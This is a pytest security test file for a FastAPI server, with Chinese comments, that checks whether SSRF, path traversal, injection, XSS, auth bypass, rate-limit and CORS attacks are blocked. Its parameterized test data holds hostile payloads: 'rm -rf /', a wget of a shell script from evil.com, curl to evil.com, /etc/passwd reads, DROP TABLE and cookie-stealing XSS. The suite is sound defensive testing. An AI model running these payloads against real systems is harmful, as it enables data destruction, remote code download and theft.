"""自动化渗透测试套件 — OWASP Top 10 + SRE 安全韧性。

覆盖:
  1. SSRF (Server-Side Request Forgery)
  2. 路径遍历
  3. 注入 (SQL / 命令 / 模板 / XSS)
  4. 鉴权绕过
  5. 速率限制
  6. 输入验证 (超大 payload / Unicode 炸弹 / JSON 炸弹 / 类型混淆)
  7. CORS 配置

核心原则: 验证"攻击被阻止", 不是验证"攻击成功"。
conftest.py 里开了 HUGINN_DEV_MODE=1, 大部分测试用 dev mode 绕过鉴权,
鉴权绕过测试单独用 monkeypatch 关掉 dev mode。
"""

from __future__ import annotations

import json
from collections import defaultdict

import pytest

# server.py 间接依赖 mcp, 没装的话整个模块都跳过
pytest.importorskip("mcp")

# Penetration tests run in integration CI job — they need full middleware stack
pytestmark = pytest.mark.integration

from fastapi import FastAPI
from fastapi.testclient import TestClient

from huginn.server import app

client = TestClient(app)


# ─── 公共 fixture ────────────────────────────────────────────────────


@pytest.fixture(autouse=True)
def _no_rate_limit():
    """关掉限流, 避免测试里高频请求被 429。"""
    from huginn.server import rate_limit_middleware

    mw_globals = rate_limit_middleware.__globals__
    saved = mw_globals.get("_RATE_LIMIT")
    mw_globals["_RATE_LIMIT"] = 0
    yield
    if saved is not None:
        mw_globals["_RATE_LIMIT"] = saved


@pytest.fixture
def enforced_auth(monkeypatch):
    """关掉 dev mode, 让 require_api_key / require_admin_key 真正生效。"""
    monkeypatch.delenv("HUGINN_DEV_MODE", raising=False)
    yield


# ═════════════════════════════════════════════════════════════════════
#  1. SSRF
# ═════════════════════════════════════════════════════════════════════


class TestSSRF:
    """/config/local-models 的 base_url 参数 SSRF 防护。

    端点是 GET (不是 POST), 接收 base_url query param,
    只允许 loopback / link-local / private 地址。
    """

    def test_external_hostname_blocked(self):
        """外部域名应该被 SSRF 防护拦截。"""
        resp = client.get(
            "/config/local-models",
            params={"base_url": "http://example.com:8080"},
        )
        data = resp.json()
        assert data["success"] is False
        err = data.get("error", "")
        assert "SSRF" in err or "blocked" in err.lower()

    def test_external_ip_blocked(self):
        """外部 IP (8.8.8.8) 应该被拦截。"""
        resp = client.get(
            "/config/local-models",
            params={"base_url": "http://8.8.8.8:8080"},
        )
        data = resp.json()
        assert data["success"] is False
        err = data.get("error", "")
        assert "SSRF" in err or "blocked" in err.lower()

    def test_non_http_scheme_blocked(self):
        """file:// / gopher:// / ftp:// 等非 http(s) scheme 应该被拒绝。"""
        for scheme in ["file:///etc/passwd", "gopher://evil.com", "ftp://evil.com"]:
            resp = client.get(
                "/config/local-models",
                params={"base_url": scheme},
            )
            data = resp.json()
            assert data["success"] is False

    def test_localhost_not_ssrf_blocked(self):
        """localhost 不应该被 SSRF 拦截 (连不上是另一回事)。"""
        resp = client.get(
            "/config/local-models",
            params={"base_url": "http://localhost:1"},
        )
        data = resp.json()
        # 不应该出现 SSRF 字样 — 端口不通是连接错误, 不是安全拦截
        assert "SSRF" not in data.get("error", "")

    def test_loopback_ip_not_ssrf_blocked(self):
        """127.0.0.1 不应该被 SSRF 拦截。"""
        resp = client.get(
            "/config/local-models",
            params={"base_url": "http://127.0.0.1:1"},
        )
        data = resp.json()
        assert "SSRF" not in data.get("error", "")

    @pytest.mark.xfail(
        reason="当前实现允许 link-local 地址 (含云元数据 IP 169.254.169.254), "
        "属于已知 SSRF 风险, 后续应收紧为只允许 loopback"
    )
    def test_cloud_metadata_endpoint_blocked(self):
        """169.254.169.254 (AWS/GCP 云元数据端点) 应该被拦截。"""
        resp = client.get(
            "/config/local-models",
            params={"base_url": "http://169.254.169.254/latest/meta-data/"},
        )
        data = resp.json()
        assert data["success"] is False
        assert "SSRF" in data.get("error", "")

    @pytest.mark.xfail(
        reason="当前实现允许 private 地址 (10.x / 172.16-31.x / 192.168.x), "
        "属于已知 SSRF 风险, 内网探测不应放开"
    )
    def test_private_ip_blocked(self):
        """10.0.0.1 (内网地址) 应该被拦截。"""
        resp = client.get(
            "/config/local-models",
            params={"base_url": "http://10.0.0.1:8080"},
        )
        data = resp.json()
        assert data["success"] is False
        assert "SSRF" in data.get("error", "")

    def test_no_hostname_blocked(self):
        """空 hostname 的 URL 应该被拒绝。"""
        resp = client.get(
            "/config/local-models",
            params={"base_url": "http://:8080"},
        )
        data = resp.json()
        assert data["success"] is False


# ═════════════════════════════════════════════════════════════════════
#  2. 路径遍历
# ═════════════════════════════════════════════════════════════════════


class TestPathTraversal:
    """路径遍历攻击测试。

    /viewer3d/load 接收 file_path 参数, 会检查路径是否在 workspace 内。
    /checkpoints/{cp_id} 的 cp_id 只做 dict 查找, 不碰文件系统。
    """

    def test_viewer3d_absolute_path_blocked(self):
        """POST /viewer3d/load 用 /etc/passwd 应该被拒绝。"""
        resp = client.post("/viewer3d/load", json={"file_path": "/etc/passwd"})
        assert resp.status_code == 200
        data = resp.json()
        assert "error" in data
        assert "workspace" in data["error"].lower()

    def test_viewer3d_parent_traversal_blocked(self):
        """POST /viewer3d/load 用 ../../../etc/passwd 应该被拒绝。"""
        resp = client.post(
            "/viewer3d/load",
            json={"file_path": "../../../etc/passwd"},
        )
        data = resp.json()
        assert "error" in data
        assert "workspace" in data["error"].lower()

    def test_viewer3d_double_dot_traversal_blocked(self):
        """POST /viewer3d/load 用 ..%2f..%2fetc%2fpasswd 应该被拒绝。"""
        resp = client.post(
            "/viewer3d/load",
            json={"file_path": "..%2f..%2fetc%2fpasswd"},
        )
        data = resp.json()
        assert "error" in data

    def test_viewer3d_trajectory_traversal_blocked(self):
        """POST /viewer3d/trajectory 用 /etc/passwd 应该被拒绝。"""
        resp = client.post(
            "/viewer3d/trajectory",
            json={"file_path": "/etc/passwd"},
        )
        data = resp.json()
        assert "error" in data
        assert "workspace" in data["error"].lower()

    def test_checkpoint_id_traversal_safe(self):
        """GET /checkpoints/../../../etc/passwd 不应该泄露文件内容。

        cp_id 只做 dict key 查找, 不会碰到文件系统。
        URL 里的 ../ 会被路由层处理掉, 实际拿到的 cp_id 是纯字符串。
        """
        # 直接用 traversal 字符串当 cp_id
        resp = client.get("/checkpoints/..%2F..%2F..%2Fetc%2Fpasswd")
        # 不管返回 200 还是 404, 都不应该泄露 /etc/passwd 内容
        data = resp.json()
        assert "root:" not in json.dumps(data)

    def test_checkpoint_create_traversal_blocked(self):
        """POST /checkpoints 用 /etc/passwd 作 path 应该被拒绝。"""
        resp = client.post("/checkpoints", json={"path": "/etc/passwd"})
        # 403 = workspace 校验拦截
        assert resp.status_code in (403, 200)
        if resp.status_code == 200:
            data = resp.json()
            # 不应该出现 /etc/passwd 的文件内容
            assert "root:" not in json.dumps(data)


# ═════════════════════════════════════════════════════════════════════
#  3. 注入测试
# ═════════════════════════════════════════════════════════════════════


class TestSQLInjection:
    """SQL 注入 payload 不应该被执行或导致 crash。"""

    @pytest.mark.parametrize(
        "payload",
        [
            "' OR 1=1 --",
            "'; DROP TABLE memories; --",
            "' UNION SELECT * FROM users --",
            "1' AND '1'='1",
            "admin'--",
        ],
    )
    def test_memory_search_sql_injection(self, payload: str):
        """POST /memory/search 用 SQL 注入 payload, 不应该 crash 或泄露数据。"""
        resp = client.post("/memory/search", json={"query": payload})
        # 不管返回 200 还是 500, 不应该 crash 整个服务
        assert resp.status_code in (200, 500)
        data = resp.json()
        # 不应该返回数据库表结构或原始 SQL 错误
        body = json.dumps(data)
        assert "sqlite_master" not in body
        assert "DROP TABLE" not in body
        assert "UNION SELECT" not in body


class TestCommandInjection:
    """命令注入 payload 不应该被执行。"""

    @pytest.mark.parametrize(
        "payload",
        [
            "; rm -rf /",
            "$(curl evil.com)",
            "| cat /etc/passwd",
            "`whoami`",
            "; wget http://evil.com/shell.sh -O /tmp/shell.sh",
        ],
    )
    def test_command_injection_in_memory(self, payload: str):
        """POST /memory 用命令注入 payload, 不应该被执行。"""
        resp = client.post("/memory", json={"content": payload})
        assert resp.status_code in (200, 500)
        data = resp.json()
        # 不应该在响应里看到命令执行结果
        body = json.dumps(data)
        assert "root:" not in body  # /etc/passwd 内容
        assert "uid=" not in body  # whoami 输出


class TestTemplateInjection:
    """模板注入 payload 不应该被渲染。"""

    @pytest.mark.parametrize(
        "payload",
        [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{config}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
        ],
    )
    def test_template_injection_not_rendered(self, payload: str):
        """模板注入 payload 不应该被求值 (不出现 49 或类信息)。"""
        resp = client.post("/memory", json={"content": payload})
        assert resp.status_code in (200, 500)
        data = resp.json()
        body = json.dumps(data)
        # {{7*7}} 不应该变成 49
        assert "49" not in body or payload in body
        # 不应该泄露 Python 类信息
        assert "__class__" not in body
        assert "__subclasses__" not in body
        assert "__mro__" not in body


class TestXSS:
    """XSS payload 不应该被反射 (未转义) 到响应里。"""

    @pytest.mark.parametrize(
        "payload",
        [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(document.cookie)</script>",
        ],
    )
    def test_xss_not_reflected_unescaped(self, payload: str):
        """XSS payload 在响应里应该被转义或存储为纯文本。"""
        resp = client.post("/memory", json={"content": payload})
        assert resp.status_code in (200, 500)
        data = resp.json()
        body = json.dumps(data)
        # JSON 序列化天然会转义 < >, 所以这里检查 payload 是否以原始形式出现
        # 关键是: 不应该出现可执行的 HTML 标签
        # JSON 里 < 会被转义成 \u003c, 所以检查原始 <script> 是否出现
        assert "<script>" not in body or "\\u003c" in body or payload not in body


# ═════════════════════════════════════════════════════════════════════
#  4. 鉴权绕过
# ═════════════════════════════════════════════════════════════════════


class TestAuthBypass:
    """鉴权绕过测试 — 关掉 dev mode 后受保护端点必须 401。"""

    def test_no_api_key_returns_401(self, enforced_auth, monkeypatch):
        """没有 API key 访问受保护端点 → 401。"""
        monkeypatch.setenv("HUGINN_API_KEY", "secret-key")
        resp = client.get("/tools")
        assert resp.status_code == 401

    def test_wrong_api_key_returns_401(self, enforced_auth, monkeypatch):
        """错误的 API key → 401。"""
        monkeypatch.setenv("HUGINN_API_KEY", "secret-key")
        resp = client.get("/tools", headers={"X-HUGINN-API-KEY": "wrong-key"})
        assert resp.status_code == 401

    def test_empty_authorization_returns_401(self, enforced_auth, monkeypatch):
        """空 Authorization header → 401。"""
        monkeypatch.setenv("HUGINN_API_KEY", "secret-key")
        resp = client.get("/tools", headers={"Authorization": ""})
        assert resp.status_code == 401

    def test_bearer_token_confusion_returns_401(self, enforced_auth, monkeypatch):
        """把 API key 放到 Bearer 位不能绕过鉴权。"""
        monkeypatch.setenv("HUGINN_API_KEY", "secret-key")
        # API key 放 Bearer 位, 不是有效 JWT
        resp = client.get(
            "/tools",
            headers={"Authorization": "Bearer secret-key"},
        )
        assert resp.status_code == 401

    def test_admin_endpoint_requires_admin_key(self, enforced_auth, monkeypatch):
        """admin 端点需要 admin key, 普通 API key 不够。"""
        monkeypatch.setenv("HUGINN_API_KEY", "user-key")
        monkeypatch.setenv("HUGINN_ADMIN_API_KEY", "admin-secret")
        # /config/providers 需要 admin key
        resp = client.get(
            "/config/providers",
            headers={"X-HUGINN-API-KEY": "user-key"},
        )
        assert resp.status_code == 401

    def test_case_insensitive_header(self, enforced_auth, monkeypatch):
        """HTTP header 大小写不敏感: huginn-api-key 也能通过。

        这是 HTTP 规范行为, 不是漏洞 — 验证大小写不会绕过鉴权。
        """
        monkeypatch.setenv("HUGINN_API_KEY", "secret-key")
        # 大写 header — HTTP 规范要求 header 名大小写不敏感
        # 正确的 key 应该能通过, 错误的不能
        resp = client.get(
            "/tools",
            headers={"x-huginn-api-key": "secret-key"},
        )
        assert resp.status_code == 200
        # 错误的 key 不管大小写都应该 401
        resp2 = client.get(
            "/tools",
            headers={"X-HUGINN-API-KEY": "wrong"},
        )
        assert resp2.status_code == 401

    def test_dev_mode_bypass_works(self, monkeypatch):
        """dev_mode=1 时不需要 API key (这是设计行为, 不是漏洞)。"""
        monkeypatch.setenv("HUGINN_DEV_MODE", "1")
        monkeypatch.delenv("HUGINN_API_KEY", raising=False)
        resp = client.get("/tools")
        assert resp.status_code == 200

    def test_public_paths_dont_need_auth(self, enforced_auth, monkeypatch):
        """公开路径 (/health) 不需要鉴权。"""
        monkeypatch.setenv("HUGINN_API_KEY", "secret-key")
        resp = client.get("/health")
        assert resp.status_code == 200

    def test_all_protected_endpoints_enforced(self, enforced_auth, monkeypatch):
        """dev_mode 关掉后, 多个受保护端点都需要鉴权。"""
        monkeypatch.setenv("HUGINN_API_KEY", "secret-key")
        for path in ["/tools", "/memory", "/config/active-model"]:
            resp = client.get(path)
            assert resp.status_code == 401, f"{path} should require auth"


# ═════════════════════════════════════════════════════════════════════
#  5. 速率限制
# ═════════════════════════════════════════════════════════════════════


class TestRateLimiting:
    """速率限制测试 — 需要临时开启限流。"""

    @pytest.fixture(autouse=True)
    def _enable_rate_limit(self):
        """临时开启限流: 设很低的阈值。"""
        from huginn.server import rate_limit_middleware

        mw_globals = rate_limit_middleware.__globals__
        saved_limit = mw_globals.get("_RATE_LIMIT")
        saved_buckets = mw_globals.get("_rate_buckets")
        mw_globals["_RATE_LIMIT"] = 3  # 每分钟只允许 3 次
        mw_globals["_rate_buckets"] = defaultdict(list)  # 清空历史 bucket
        yield
        mw_globals["_RATE_LIMIT"] = saved_limit or 0
        mw_globals["_rate_buckets"] = saved_buckets or {}

    def test_burst_requests_get_429(self):
        """连续请求超过阈值后应该返回 429。"""
        # /health 不受限流, 用 /tools 凑满配额
        for _ in range(3):
            resp = client.get("/tools")
            assert resp.status_code == 200

        # 第 4 次应该被限流
        resp = client.get("/tools")
        assert resp.status_code == 429

    def test_429_includes_retry_after(self):
        """429 响应应该包含 Retry-After header。"""
        # 先把配额用完
        for _ in range(3):
            client.get("/tools")

        resp = client.get("/tools")
        assert resp.status_code == 429
        assert "retry-after" in {k.lower() for k in resp.headers.keys()}

    def test_health_not_rate_limited(self):
        """/health 不受速率限制 (中间件里跳过了)。"""
        # 即使超过阈值, /health 也不应该被限流
        for _ in range(10):
            resp = client.get("/health")
            assert resp.status_code == 200


# ═════════════════════════════════════════════════════════════════════
#  6. 输入验证
# ═════════════════════════════════════════════════════════════════════


class TestInputValidation:
    """输入验证测试 — 各种畸形输入不应该导致 crash。"""

    def test_large_payload_rejected(self):
        """超大 payload (>1MB) 应该被 RequestSizeLimitMiddleware 拦截。

        创建一个带小 limit 的最小 app 来验证中间件行为。
        """
        from huginn.middleware.limits import RequestSizeLimitMiddleware

        mini_app = FastAPI()

        @mini_app.post("/echo")
        async def echo(data: dict):
            return {"ok": True}

        # 直接替换中间件实例 — 比 monkeypatch env 更可靠
        # 原始 app 的中间件 list 里找 RequestSizeLimitMiddleware, 设小 limit
        mini_app.add_middleware(RequestSizeLimitMiddleware, max_bytes=1024)  # 1KB limit

        c = TestClient(mini_app)
        # 2KB payload 应该被 413 拒绝
        big_data = {"data": "x" * 2048}
        resp = c.post("/echo", json=big_data)
        assert resp.status_code == 413

    def test_long_string_no_crash(self):
        """超长字符串 (>10000 chars) 不应该 crash。"""
        long_str = "A" * 10001
        resp = client.post("/memory", json={"content": long_str})
        assert resp.status_code in (200, 500)
        # 不应该是 5xx 之外的 crash
        assert resp.status_code != 502

    def test_unicode_bomb_no_crash(self):
        """Unicode 炸弹 (大量 combining characters) 不应该 crash。"""
        # U+0300 (COMBINING GRAVE ACCENT) 重复很多次
        bomb = "e" + "\u0300" * 5000
        resp = client.post("/memory", json={"content": bomb})
        assert resp.status_code in (200, 500)

    def test_json_bomb_deep_nesting(self):
        """深层嵌套 JSON 不应该 crash (JSON 炸弹)。"""
        # 构建深层嵌套 dict
        nested = "x"
        for _ in range(200):
            nested = {"a": nested}
        resp = client.post("/memory", json={"content": json.dumps(nested)})
        assert resp.status_code in (200, 500)

    def test_null_values_handled(self):
        """null 值不应该 crash。"""
        resp = client.post("/memory/search", json={"query": None})
        assert resp.status_code in (200, 500)

    def test_nan_values_handled(self):
        """NaN 值 (非标准 JSON) 应该被拒绝或安全处理。"""
        # 标准 JSON 不支持 NaN, 但 Python json.loads 默认接受
        # 用 raw body 发送
        resp = client.post(
            "/memory/search",
            content='{"query": NaN}',
            headers={"Content-Type": "application/json"},
        )
        # 要么 422 (FastAPI 拒绝非标准 JSON), 要么 400
        assert resp.status_code in (200, 400, 422, 500)

    def test_array_injection_handled(self):
        """期望 string 传 array 不应该 crash。"""
        resp = client.post("/memory/search", json={"query": ["array", "injection"]})
        assert resp.status_code in (200, 500)

    def test_type_confusion_string_for_int(self):
        """期望 int 传 string 不应该 crash。"""
        # /memory 的 limit 参数期望 int
        resp = client.get("/memory", params={"limit": "not_a_number"})
        assert resp.status_code in (200, 422, 500)

    def test_object_injection_handled(self):
        """传嵌套 object 当 query 不应该 crash。"""
        resp = client.post(
            "/memory/search",
            json={"query": {"nested": {"deep": "object"}}},
        )
        assert resp.status_code in (200, 500)

    def test_empty_body_handled(self):
        """空 body 不应该 crash。"""
        resp = client.post(
            "/memory/search",
            content="",
            headers={"Content-Type": "application/json"},
        )
        assert resp.status_code in (400, 422, 500)

    def test_invalid_json_handled(self):
        """畸形 JSON 不应该 crash。"""
        resp = client.post(
            "/memory/search",
            content='{invalid json,,,}',
            headers={"Content-Type": "application/json"},
        )
        assert resp.status_code in (400, 422)


# ═════════════════════════════════════════════════════════════════════
#  7. CORS
# ═════════════════════════════════════════════════════════════════════


class TestCORS:
    """CORS 配置测试。"""

    def test_preflight_returns_cors_headers(self):
        """OPTIONS preflight 应该返回 CORS headers。"""
        resp = client.options(
            "/tools",
            headers={
                "Origin": "http://localhost:3000",
                "Access-Control-Request-Method": "GET",
                "Access-Control-Request-Headers": "Content-Type",
            },
        )
        # CORS 中间件应该处理 preflight
        assert resp.status_code in (200, 204)
        assert "access-control-allow-methods" in {k.lower() for k in resp.headers.keys()}

    def test_arbitrary_origin_not_reflected(self):
        """任意 Origin 不应该被反射到 Access-Control-Allow-Origin。"""
        resp = client.get(
            "/tools",
            headers={"Origin": "https://evil.example.com"},
        )
        acao = resp.headers.get("access-control-allow-origin", "")
        # 不应该反射任意 origin
        assert acao != "https://evil.example.com"
        assert acao != "*"

    def test_localhost_origin_allowed(self):
        """localhost origin 应该被允许 (在默认 CORS 白名单里)。"""
        resp = client.get(
            "/tools",
            headers={"Origin": "http://localhost:3000"},
        )
        acao = resp.headers.get("access-control-allow-origin", "")
        assert acao == "http://localhost:3000"

    def test_credentials_and_wildcard_not_both(self, monkeypatch):
        """Credentials 和 wildcard 不能同时启用。

        CORS 规范禁止 allow_credentials=True 且 allow_origins=["*"]。
        _get_cors_origins 默认不含 *, allow_credentials 取决于 * 是否在 origins 里。
        """
        from huginn.lifespan import _get_cors_origins

        # 默认配置: 不含 *
        origins = _get_cors_origins()
        assert "*" not in origins
        # 默认不含 * → allow_credentials=True, 这是安全的

        # 如果用户设了 HUGINN_CORS_ORIGINS="*", 也不应该同时开 credentials
        monkeypatch.setenv("HUGINN_CORS_ORIGINS", "*")
        origins_wildcard = _get_cors_origins()
        assert "*" in origins_wildcard
        # server.py 里: allow_credentials="*" not in _cors_origins
        # 所以 * 在 origins 里时, credentials 会自动关掉
        allow_credentials = "*" not in origins_wildcard
        assert allow_credentials is False

    def test_cors_allow_methods_correct(self):
        """CORS 应该只允许配置的 HTTP methods。"""
        resp = client.options(
            "/tools",
            headers={
                "Origin": "http://localhost:3000",
                "Access-Control-Request-Method": "GET",
            },
        )
        acam = resp.headers.get("access-control-allow-methods", "")
        # 应该包含 GET, 不应该包含 TRACE / CONNECT
        assert "GET" in acam
        assert "TRACE" not in acam.upper()
        assert "CONNECT" not in acam.upper()

    def test_cors_allow_headers_correct(self):
        """CORS 应该只允许配置的 headers。"""
        resp = client.options(
            "/tools",
            headers={
                "Origin": "http://localhost:3000",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "X-HUGINN-API-KEY",
            },
        )
        acah = resp.headers.get("access-control-allow-headers", "")
        # X-HUGINN-API-KEY 应该在允许列表里
        assert "huginn-api-key" in acah.lower() or "x-huginn-api-key" in acah.lower()
